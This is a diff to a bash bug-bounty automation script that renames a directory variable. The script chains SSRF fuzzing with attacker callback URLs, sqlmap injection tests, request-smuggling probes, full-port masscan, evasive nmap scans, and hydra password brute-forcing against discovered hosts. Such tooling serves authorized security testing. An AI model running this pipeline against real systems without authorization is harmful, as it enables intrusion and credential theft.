-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?p=
     # ffuf -s -c -u HOST/\?p=$ATTACKER/DOMAIN/ \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # ?url=&file=
     # ffuf -s -c -u HOST/\?url=$ATTACKERURL/DOMAIN/url\&file=$ATTACKERURL/DOMAIN/file \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # manifest.json?url=
     # ffuf -s -c -u HOST/manifest.json\?url=$ATTACKERURL/DOMAIN/url \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # ?returnUrl=
     # ffuf -s -c -u HOST/\?returnUrl=$ATTACKERURL/DOMAIN/url \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     if [[ -n "$mad" && -s "$customSsrfQueryList" ]]; then
       # similar to paramspider but all wayback without limits
@@ -450,21 +450,21 @@ ssrftest(){
         ITERATOR=$((ITERATOR+1))
         echo "processing $ITERATOR line"
         echo "[line] $line"
-        echo "${line}${ATTACKER}" >> $targetDir/ssrf-list.txt
+        echo "${line}${ATTACKER}" >> $TARGETDIR/ssrf-list.txt
       done < $customSsrfQueryList
 
-      if [ -s $targetDir/ssrf-list.txt ]; then
-        chown $HOMEUSER: $targetDir/ssrf-list.txt
+      if [ -s $TARGETDIR/ssrf-list.txt ]; then
+        chown $HOMEUSER: $TARGETDIR/ssrf-list.txt
         # simple math to watch progress
-        HOSTCOUNT=$(cat $targetDir/3-all-subdomain-live-scheme.txt | wc -l)
-        ENDPOINTCOUNT=$(cat $targetDir/ssrf-list.txt | wc -l)
+        HOSTCOUNT=$(cat $TARGETDIR/3-all-subdomain-live-scheme.txt | wc -l)
+        ENDPOINTCOUNT=$(cat $TARGETDIR/ssrf-list.txt | wc -l)
         echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
         echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
           echo "[SSRF-3] fuzz gf ssrf endpoints "
           ffuf -s -r -c -t 50 -u HOST/PATH \
-              -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-              -w $targetDir/ssrf-list.txt:PATH > /dev/null
+              -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+              -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
       fi
     fi
   fi
@@ -478,7 +478,7 @@ lfitest(){
     echo "[LFI] nuclei testing..."
     nuclei -stats -l $customLfiQueryList \
                     -t vulnerabilities/other/storenth-lfi.yaml \
-                    -o $targetDir/nuclei/lfi_output.txt
+                    -o $TARGETDIR/nuclei/lfi_output.txt
   fi
 }
 sqlmaptest(){
@@ -486,21 +486,21 @@ sqlmaptest(){
     # perform the sqlmap
     echo "[sqlmap] SQLi testing..."
     # turn on more tests by swithing: --risk=3 --level=5
-    sqlmap -m $customSqliQueryList --batch --random-agent -f --banner --ignore-code=404 --ignore-timeouts  --output-dir=$targetDir/sqlmap/
+    sqlmap -m $customSqliQueryList --batch --random-agent -f --banner --ignore-code=404 --ignore-timeouts  --output-dir=$TARGETDIR/sqlmap/
   fi
 }
 
 smugglertest(){
   echo "[smuggler.py] Try to find request smuggling vulns..."
-  smuggler -u $targetDir/3-all-subdomain-live-scheme.txt
+  smuggler -u $TARGETDIR/3-all-subdomain-live-scheme.txt
 
   # check for VULNURABLE keyword
-  if [ -s $targetDir/smuggler/output ]; then
-    cat ./smuggler/output | grep 'VULNERABLE' > $targetDir/smugglinghosts.txt
-    if [ -s $targetDir/smugglinghosts.txt ]; then
+  if [ -s $TARGETDIR/smuggler/output ]; then
+    cat ./smuggler/output | grep 'VULNERABLE' > $TARGETDIR/smugglinghosts.txt
+    if [ -s $TARGETDIR/smugglinghosts.txt ]; then
       echo "Smuggling vulnerability found under the next hosts:"
       echo
-      cat $targetDir/smugglinghosts.txt | grep 'VULN'
+      cat $TARGETDIR/smugglinghosts.txt | grep 'VULN'
     else
       echo "There are no Request Smuggling host found"
     fi
@@ -514,19 +514,19 @@ smugglertest(){
 #   nmap -sS -PN -T4 --script='http-title' -oG nmap_output_og.txt
 # }
 masscantest(){
-  if [ -s $targetDir/dnsprobe_ip.txt ]; then
+  if [ -s $TARGETDIR/dnsprobe_ip.txt ]; then
     echo "[masscan] Looking for open ports..."
     # max-rate for accuracy
     # 25/587-smtp, 110/995-pop3, 143/993-imap, 445-smb, 3306-mysql, 3389-rdp, 5432-postgres, 5900/5901-vnc, 27017-mongodb
-    # masscan -p0-65535 | -p0-1000,2375,3306,3389,4990,5432,5900,6379,6066,8080,8383,8500,8880,8983,9000,27017 -iL $targetDir/dnsprobe_ip.txt --rate 1000 --open-only -oG $targetDir/masscan_output.gnmap
-    masscan -p0-65535 -iL $targetDir/dnsprobe_ip.txt --rate 500 -oG $targetDir/masscan_output.gnmap
+    # masscan -p0-65535 | -p0-1000,2375,3306,3389,4990,5432,5900,6379,6066,8080,8383,8500,8880,8983,9000,27017 -iL $TARGETDIR/dnsprobe_ip.txt --rate 1000 --open-only -oG $TARGETDIR/masscan_output.gnmap
+    masscan -p0-65535 -iL $TARGETDIR/dnsprobe_ip.txt --rate 500 -oG $TARGETDIR/masscan_output.gnmap
     sleep 1
-    sed "${SEDOPTION[@]}" '1d;2d;$d' $targetDir/masscan_output.gnmap # remove 1,2 and last lines from masscan out file
+    sed "${SEDOPTION[@]}" '1d;2d;$d' $TARGETDIR/masscan_output.gnmap # remove 1,2 and last lines from masscan out file
   fi
 }
 
 # NSE-approach
-# nmap --script "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-*" -iL $targetDir/nmap_input.txt
+# nmap --script "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-*" -iL $TARGETDIR/nmap_input.txt
 nmap_nse(){
   # https://gist.github.com/storenth/b419dc17d2168257b37aa075b7dd3399
   # https://youtu.be/La3iWKRX-tE?t=1200
@@ -549,10 +549,10 @@ nmap_nse(){
 
     # grep smtp /usr/local/Cellar/nmap/7.91/share/nmap/scripts/script.db
     # grep "intrusive" /usr/share/nmap/scripts/script.db
-    nmap --spoof-mac 0 -n -sV --version-intensity 9 --script=default,http-headers -sS -Pn -T4 -f -p$PORT -oG $targetDir/nmap/$FILENAME $IP
+    nmap --spoof-mac 0 -n -sV --version-intensity 9 --script=default,http-headers -sS -Pn -T4 -f -p$PORT -oG $TARGETDIR/nmap/$FILENAME $IP
     echo
     echo
-  done < $targetDir/masscan_output.gnmap
+  done < $TARGETDIR/masscan_output.gnmap
 }
 
 # hydra user/password attack on popular protocols
@@ -566,9 +566,9 @@ hydratest(){
 
     if [ "$PROTOCOL" = "ftp" -o "$PROTOCOL" = "ssh" -o "$PROTOCOL" = "smtp" -o "$PROTOCOL" = "mysql" ]; then
       echo "[hydra] scanning $IP on $PORT port using $PROTOCOL protocol"
-      hydra -o $targetDir/hydra/$FILENAME -b text -L $usersList -P $passwordsList -s $PORT $IP $PROTOCOL
+      hydra -o $TARGETDIR/hydra/$FILENAME -b text -L $usersList -P $passwordsList -s $PORT $IP $PROTOCOL
     fi
-  done < $targetDir/masscan_output.gnmap
+  done < $TARGETDIR/masscan_output.gnmap
 }
 
 # directory bruteforce
@@ -579,9 +579,9 @@ ffufbrute(){
     while read subdomain; do
       # -c stands for colorized, -s for silent mode
       ffuf -c -s -u ${subdomain}/FUZZ -p 0.1-2.0 -recursion -recursion-depth 2 -mc all -fc 300,301,302,303,304,400,403,404,500,501,502,503 -fs 0 -w $dirsearchWordlist -t $dirsearchThreads \
-          -o $targetDir/ffuf/${iterator}.html  -of html
+          -o $TARGETDIR/ffuf/${iterator}.html  -of html
       iterator=$((iterator+1))
-    done < $targetDir/3-all-subdomain-live-scheme.txt
+    done < $TARGETDIR/3-all-subdomain-live-scheme.txt
   fi
 }
 
@@ -632,9 +632,9 @@ recon(){
 
 report(){
   echo "Generating HTML-report here..."
-  ./report.sh $1 $targetDir > $targetDir/report.html
-  chromium --headless --disable-gpu --print-to-pdf=${targetDir}/report.pdf file://${targetDir}/report.html
-  chown $HOMEUSER: $targetDir/report.pdf
+  ./report.sh $1 $TARGETDIR > $TARGETDIR/report.html
+  chromium --headless --disable-gpu --print-to-pdf=${TARGETDIR}/report.pdf file://${TARGETDIR}/report.html
+  chown $HOMEUSER: $TARGETDIR/report.pdf
   echo "Report done!"
 }
 
@@ -659,7 +659,7 @@ main(){
   # parse cidr input to create valid directory
   if [[ -n "$cidr" ]]; then
     CIDRFILEDIR=$(echo $1 | sed "s/\//_/")
-    targetDir=$STORAGEDIR/$CIDRFILEDIR/$foldername
+    TARGETDIR=$STORAGEDIR/$CIDRFILEDIR/$foldername
     if [ -d "$STORAGEDIR/$CIDRFILEDIR" ]; then
       echo "This is a known target."
     else
@@ -667,100 +667,100 @@ main(){
     fi
   elif [[ -n "$list" ]]; then
     LISTFILEDIR=$(basename $1 | sed 's/[.]txt$//')
-    targetDir=$STORAGEDIR/$LISTFILEDIR/$foldername
+    TARGETDIR=$STORAGEDIR/$LISTFILEDIR/$foldername
     if [ -d "$STORAGEDIR/$LISTFILEDIR" ]; then
       echo "This is a known target."
     else
       mkdir -p $STORAGEDIR/$LISTFILEDIR
     fi
   else
-    targetDir=$STORAGEDIR/$1/$foldername
+    TARGETDIR=$STORAGEDIR/$1/$foldername
     if [ -d "$STORAGEDIR/$1" ]; then
       echo "This is a known target."
     else
       mkdir -p $STORAGEDIR/$1
     fi
   fi
-  mkdir -p $targetDir
+  mkdir -p $TARGETDIR
 
   # Listen server
-  simplehttpserver -listen 0.0.0.0:$LISTENPORT -v &> $targetDir/_listen_server.log &
+  simplehttpserver -listen 0.0.0.0:$LISTENPORT -v &> $TARGETDIR/_listen_server.log &
   SERVER_PID=$!
 
   # collect call parameters
-  echo "$@" >> $targetDir/_call_params.txt
+  echo "$@" >> $TARGETDIR/_call_params.txt
   echo "$@" >> ./_call.log
 
   # used for ffuf bruteforce
   if [ "$mad" = "1" ]; then
 
     # merged wayback, gospider, nuclei list
-    touch $targetDir/query_list.txt
-    queryList=$targetDir/query_list.txt
+    touch $TARGETDIR/query_list.txt
+    queryList=$TARGETDIR/query_list.txt
 
     # to work with gf ssrf output
-    touch $targetDir/custom_ssrf_list.txt
-    customSsrfQueryList=$targetDir/custom_ssrf_list.txt
+    touch $TARGETDIR/custom_ssrf_list.txt
+    customSsrfQueryList=$TARGETDIR/custom_ssrf_list.txt
     # to work with gf lfi output
-    touch $targetDir/custom_lfi_list.txt
-    customLfiQueryList=$targetDir/custom_lfi_list.txt
+    touch $TARGETDIR/custom_lfi_list.txt
+    customLfiQueryList=$TARGETDIR/custom_lfi_list.txt
     # to work with gf ssrf output
-    touch $targetDir/custom_sqli_list.txt
-    customSqliQueryList=$targetDir/custom_sqli_list.txt
+    touch $TARGETDIR/custom_sqli_list.txt
+    customSqliQueryList=$TARGETDIR/custom_sqli_list.txt
 
-    # touch $targetDir/custom_path_list.txt
-    # customPathWordList=$targetDir/custom_path_list.txt
+    # touch $TARGETDIR/custom_path_list.txt
+    # customPathWordList=$TARGETDIR/custom_path_list.txt
   fi
   # used to save target specific list for alterations (shuffledns, altdns)
   if [ "$alt" = "1" ]; then
-    touch $targetDir/custom_subdomains_wordlist.txt
-    customSubdomainsWordList=$targetDir/custom_subdomains_wordlist.txt
+    touch $TARGETDIR/custom_subdomains_wordlist.txt
+    customSubdomainsWordList=$TARGETDIR/custom_subdomains_wordlist.txt
     cp $altdnsWordlist $customSubdomainsWordList
   fi
 
   if [ "$brute" = "1" ]; then
     # ffuf dir uses to store brute output
-    mkdir $targetDir/ffuf/
+    mkdir $TARGETDIR/ffuf/
   fi
   # if [ "$brute" = "1" -a "$mad" = "1" ]; then
-    # touch $targetDir/custom_ffuf_wordlist.txt
-    # customFfufWordList=$targetDir/custom_ffuf_wordlist.txt
+    # touch $TARGETDIR/custom_ffuf_wordlist.txt
+    # customFfufWordList=$TARGETDIR/custom_ffuf_wordlist.txt
     # cp $dirsearchWordlist $customFfufWordList
   # fi
 
   # nuclei output
-  mkdir $targetDir/nuclei/
+  mkdir $TARGETDIR/nuclei/
   # nmap output
-  mkdir $targetDir/nmap/
+  mkdir $TARGETDIR/nmap/
   # hydra output
-  mkdir $targetDir/hydra/
+  mkdir $TARGETDIR/hydra/
   if [ "$mad" = "1" ]; then
     # gospider output
-    mkdir $targetDir/gospider/
-    # touch $targetDir/gospider/gospider-paths-list.txt
+    mkdir $TARGETDIR/gospider/
+    # touch $TARGETDIR/gospider/gospider-paths-list.txt
     # hakrawler output
-    # mkdir $targetDir/hakrawler/
-    # touch $targetDir/hakrawler/hakrawler-paths-list.txt
+    # mkdir $TARGETDIR/hakrawler/
+    # touch $TARGETDIR/hakrawler/hakrawler-paths-list.txt
     # sqlmap output
-    mkdir $targetDir/sqlmap/
+    mkdir $TARGETDIR/sqlmap/
     # gau/waybackurls output
-    mkdir $targetDir/wayback/
-    # touch $targetDir/wayback/wayback-paths-list.txt
+    mkdir $TARGETDIR/wayback/
+    # touch $TARGETDIR/wayback/wayback-paths-list.txt
   fi
   # brutespray output
-  # mkdir $targetDir/brutespray/
+  # mkdir $TARGETDIR/brutespray/
   # subfinder list of subdomains
-  touch $targetDir/subfinder-list.txt 
+  touch $TARGETDIR/subfinder-list.txt 
   # assetfinder list of subdomains
-  touch $targetDir/assetfinder-list.txt
+  touch $TARGETDIR/assetfinder-list.txt
   # all assetfinder/subfinder finded domains
-  touch $targetDir/enumerated-subdomains.txt
+  touch $TARGETDIR/enumerated-subdomains.txt
   # amass list of subdomains
-  # touch $targetDir/amass-list.txt
+  # touch $TARGETDIR/amass-list.txt
   # shuffledns list of subdomains
-  touch $targetDir/shuffledns-list.txt
+  touch $TARGETDIR/shuffledns-list.txt
   # gau/waybackurls list of subdomains
-  touch $targetDir/wayback-subdomains-list.txt
+  touch $TARGETDIR/wayback-subdomains-list.txt
 
   # clean up when script receives a signal
   trap clean_up SIGHUP SIGINT SIGTERM SIGSTOP SIGKILL
@@ -771,8 +771,8 @@ main(){
 
 clean_up() {
   # Perform program exit housekeeping
-  echo "housekeeping rm -rf $targetDir"
-  rm -rf $targetDir
+  echo "housekeeping rm -rf $TARGETDIR"
+  rm -rf $TARGETDIR
   kill_listen_server
   exit 1
 }
@@ -899,8 +899,8 @@ kill_listen_server
 
 if [[ -n "$discord" ]]; then
   ./discord-hook.sh "[info] $1 done"
-  if [[ -s $targetDir/report.html ]]; then
-    ./helpers/discord-file-hook.sh $targetDir/report.pdf
+  if [[ -s $TARGETDIR/report.html ]]; then
+    ./helpers/discord-file-hook.sh $TARGETDIR/report.pdf
   fi
 fi
 
